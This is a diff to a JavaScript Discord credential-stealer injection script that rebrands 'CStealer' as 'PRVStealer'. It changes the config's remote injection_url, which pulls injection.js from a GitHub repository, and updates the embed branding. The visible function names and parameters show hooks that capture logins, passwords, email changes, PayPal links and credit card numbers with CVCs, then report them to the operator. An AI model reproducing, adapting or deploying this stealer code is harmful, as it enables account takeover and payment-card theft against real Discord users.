@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'CStealer Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
+  embed_name: 'PRVStealer Injection', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/976897876535935066/1200568675883831306/hulk.jpg?ex=65c6a7b5&is=65b432b5&hm=ef80f25920a9404a749834e6d89a77fbbe78fad08acbeec0efbafb2f46f971e9&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/RealKramp31/index/main/injection.js', 
   /**
    
    **/
@@ -680,8 +680,8 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'PRVStealer Injection・discord.gg/bursa',
+            icon_url: "https://cdn.discordapp.com/attachments/976897876535935066/1200568675883831306/hulk.jpg?ex=65c6a7b5&is=65b432b5&hm=ef80f25920a9404a749834e6d89a77fbbe78fad08acbeec0efbafb2f46f971e9&"
         },
       },
     ],
@@ -723,8 +723,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'PRVStealer Injection・discord.gg/bursa',
+            icon_url: "https://cdn.discordapp.com/attachments/976897876535935066/1200568675883831306/hulk.jpg?ex=65c6a7b5&is=65b432b5&hm=ef80f25920a9404a749834e6d89a77fbbe78fad08acbeec0efbafb2f46f971e9&"
         },
       },
     ],
@@ -766,8 +766,8 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'PRVStealer Injection・discord.gg/bursa',
+            icon_url: "https://cdn.discordapp.com/attachments/976897876535935066/1200568675883831306/hulk.jpg?ex=65c6a7b5&is=65b432b5&hm=ef80f25920a9404a749834e6d89a77fbbe78fad08acbeec0efbafb2f46f971e9&"
         },
       },
     ],
@@ -809,8 +809,8 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'PRVStealer Injection・discord.gg/bursa',
+            icon_url: "https://cdn.discordapp.com/attachments/976897876535935066/1200568675883831306/hulk.jpg?ex=65c6a7b5&is=65b432b5&hm=ef80f25920a9404a749834e6d89a77fbbe78fad08acbeec0efbafb2f46f971e9&"
         },
       },
     ],
@@ -852,8 +852,8 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'PRVStealer Injection・discord.gg/bursa',
+            icon_url: "https://cdn.discordapp.com/attachments/976897876535935066/1200568675883831306/hulk.jpg?ex=65c6a7b5&is=65b432b5&hm=ef80f25920a9404a749834e6d89a77fbbe78fad08acbeec0efbafb2f46f971e9&"
         },
       },
     ],
@@ -897,8 +897,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'PRVStealer Injection・discord.gg/bursa',
+            icon_url: "https://cdn.discordapp.com/attachments/976897876535935066/1200568675883831306/hulk.jpg?ex=65c6a7b5&is=65b432b5&hm=ef80f25920a9404a749834e6d89a77fbbe78fad08acbeec0efbafb2f46f971e9&"
         },
       },
     ],
